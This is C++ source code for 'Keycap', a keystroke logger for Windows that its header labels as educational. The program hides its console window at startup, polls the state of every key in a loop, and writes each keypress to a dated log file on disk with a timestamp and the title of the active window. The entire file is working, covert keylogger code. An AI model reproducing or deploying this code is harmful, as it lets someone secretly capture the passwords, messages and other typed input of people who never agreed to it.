/*
 * Copyright (c) 2015 Richard B Tilley <brad@w8rbt.org>
 *
 * Permission to use, copy, modify, and distribute this software for any
 * purpose with or without fee is hereby granted, provided that the above
 * copyright notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
 * WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
 * ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
 * WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
 * ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 *
 * Keycap - A simple keystroke logger for Windows intended
 *          for educational purposes and demonstration.
 *
 */

#include "keycap.hpp"

#include <direct.h>

#include <chrono>  // NOLINT [build/c++11]
#include <cstdint>
#include <cstdlib>
#include <ctime>
#include <fstream>
#include <iostream>
#include <map>
#include <string>
#include <vector>

std::ofstream logfile;

void openLogFile(char *filepath) { logfile.open(filepath); }

bool isLogFileOpen() { return logfile.is_open(); }

void closeLogFile() {
  if (isLogFileOpen()) logfile.close();
}

void hideWindow() {
  /**
   * Sets the specified window's show state.
   * @param hWnd -> A handle to the window.
   *                GetConsoleWindow()
   *                Retrieves the window handle used by the console
   *                associated with the calling process.
   * @param nCmdShow -> window visibility
   *
   */

  HWND hWnd = GetConsoleWindow();
  int nCmdShow = SW_HIDE;
  ShowWindow(hWnd, nCmdShow);
}

/**
 * Creates Timestamp
 * @return timestamp
 */
const tm *timestamp() {
  time_t ltime;
  struct tm *Tm;

  ltime = time(NULL);
  Tm = std::localtime(&ltime);

  return Tm;
}

/**
 * Create directory and return filename to write the log
 * @param buffer filename to write
 * @param length length of the buffer
 */
void setupStreams(char *buffer, const int length) {
  const char *directory_fmt = "mkdir \"A:\\Logs\\Keys\\%Y\\%Y-%m\\\"";
  const char *filepath_fmt = "A:/Logs/Keys/%Y/%Y-%m/%Y-%m-%d_%H_%M_%S.log";

  const struct tm *time = timestamp();
  std::strftime(buffer, length, directory_fmt, time);
  system(buffer);
  std::cout << buffer;

  std::strftime(buffer, length, filepath_fmt, time);

  std::cout << "\n" << buffer;
}

/**
 * Logs keystrokes from keybooard and dumps to file
 *
 * This function sleeps for SLEEP_IN_MILLSECONDS milliseconds to minimise
 * cpu usage.
 */
void startLogging() {
  const int TIMESTAMP_STR_LENGTH = 32;
  const char *TIMESTAM_STR_FMT = "%Y-%m-%d_%H:%M:%S";
  const int WINDOW_TITLE_LENGTH = 2048;
  const int SLEEP_IN_MILLSECONDS = 10;

  logfile << "TIME|KEY|WINDOW\n";

  std::chrono::time_point<std::chrono::system_clock> system_clock =
      std::chrono::system_clock::now();

  std::map<std::int16_t, std::vector<std::string>> keys = vk();
  std::map<std::int16_t, std::vector<std::string>>::const_iterator keyit;

  char *timestamp = (char *)calloc(  // NOLINT [readability/casting]
      TIMESTAMP_STR_LENGTH, sizeof(char));
  std::string character_key;

  bool is_shift_key_pressed;

  // Windows handle & title
  HWND activeWindowHandler;

  // TCHAR activeWindowTitle[WINDOW_TITLE_LENGTH];
  TCHAR *activeWindowTitle = (TCHAR *)calloc(  // NOLINT [readability/casting]
      WINDOW_TITLE_LENGTH, sizeof(TCHAR));

  while (true) {
    is_shift_key_pressed = false;
    activeWindowHandler = GetForegroundWindow();

    for (keyit = keys.begin(); keyit != keys.end(); ++keyit) {
      system_clock = std::chrono::system_clock::now();
      std::time_t system_time =
          std::chrono::system_clock::to_time_t(system_clock);
      std::strftime(timestamp, TIMESTAMP_STR_LENGTH, TIMESTAM_STR_FMT,
                    std::localtime(&system_time));

      std::int16_t key_state = GetAsyncKeyState(keyit->first);
      GetWindowText(activeWindowHandler, activeWindowTitle,
                    WINDOW_TITLE_LENGTH);

      // Shift key is down. MSB is set.
      if (key_state == -32768 && keyit->first == 16) {
        is_shift_key_pressed = true;
      }

      // Key state has changed. LSB is set.
      if (key_state == -32767) {
        if (is_shift_key_pressed) {
          // Handle Uppercase Characters
          logfile << timestamp << "|" << keyit->second[1] << "|\"";
          logfile << activeWindowTitle << "\"\n";
          character_key = keyit->second[1];
        } else {
          // Handle Lowercase Characters
          logfile << timestamp << "|" << keyit->second[0] << "|\"";
          logfile << activeWindowTitle << "\"\n";
          character_key = keyit->second[0];
        }
      }
    }

    // Sleep() requires WinXP or later (sleep 15 milliseconds)
    // Can be removed entirely to capture Yubikey, etc.
    // but may be CPU intensive
    Sleep(SLEEP_IN_MILLSECONDS);
  }
}

int main() {
  hideWindow();

  const int filename_length = 120;
  char *filename = (char *)calloc(  // NOLINT [readability/casting]
      filename_length, sizeof(char));

  std::cout << strlen(filename) << "\n" << filename;

  setupStreams(filename, filename_length);

  openLogFile(filename);

  /**
   * Register call to closeLogFile when the user exits
   */
  std::atexit(closeLogFile);

  if (isLogFileOpen()) {
    std::cout << "Success\n";
  } else {
    std::cerr << "Failed to open log file at" << filename;
    exit(0);
  }

  startLogging();

  return 0;
}
